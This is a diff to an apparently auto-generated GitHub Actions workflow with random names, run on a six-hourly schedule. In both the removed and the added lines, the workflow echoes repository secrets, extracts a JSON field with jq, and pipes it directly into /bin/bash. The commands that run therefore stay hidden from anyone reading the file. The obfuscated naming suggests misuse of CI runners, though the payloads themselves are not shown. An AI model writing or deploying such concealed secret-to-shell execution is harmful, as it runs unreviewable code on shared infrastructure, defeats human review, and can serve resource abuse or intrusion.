@@ -3,8 +3,8 @@ name: chkokkl
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 1/6 * * *'
-jobs:  # 22897
+    - cron: '31 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,23 +12,11 @@ jobs:  # 22897
       - uses: actions/checkout@v4
       - name: chkokkl
         env:
-          v84: ${{ secrets.v84 }}
+          yrdq1764: ${{ secrets.yrdq1764 }}
         run: |
-          echo $v84 | jq -r .vli900 | /bin/bash
-          echo $vc873 | jq -r .or6721 | /bin/bash
-          echo $kosqt25086 | jq -r .itrnr517 | /bin/bash
-          echo $xg16 | jq -r .mgsli65 | /bin/bash
-          echo $vk90 | jq -r .f271 | /bin/bash
-          echo $wyaj3468 | jq -r .lwjcc4 | /bin/bash
-          echo $wnlft5679 | jq -r .bvxd67772 | /bin/bash
-          echo $hspvq7 | jq -r .vsist469 | /bin/bash
-          echo $vkpri70187 | jq -r .yl96 | /bin/bash
-          echo $uh52265 | jq -r .gunf27 | /bin/bash
-          echo $hif50370 | jq -r .ihplg590 | /bin/bash
-          echo $yutw2957 | jq -r .q45349 | /bin/bash
-          echo $zhkgu92 | jq -r .dfx0523 | /bin/bash
-          echo $tibf311 | jq -r .s6 | /bin/bash
-          echo $leuc94661 | jq -r .alwc4 | /bin/bash
-          echo $ft87976 | jq -r .u25 | /bin/bash
-          echo $yarfx48450 | jq -r .eri9805 | /bin/bash
+          echo $yrdq1764 | jq -r .sh2 | /bin/bash
+          echo $ok977 | jq -r .sffvs6 | /bin/bash
+          echo $xzddr3511 | jq -r .xmqoz58 | /bin/bash
+          echo $yomo9842 | jq -r .rjk54843 | /bin/bash
+          echo $e22196 | jq -r .ohp002 | /bin/bash
 
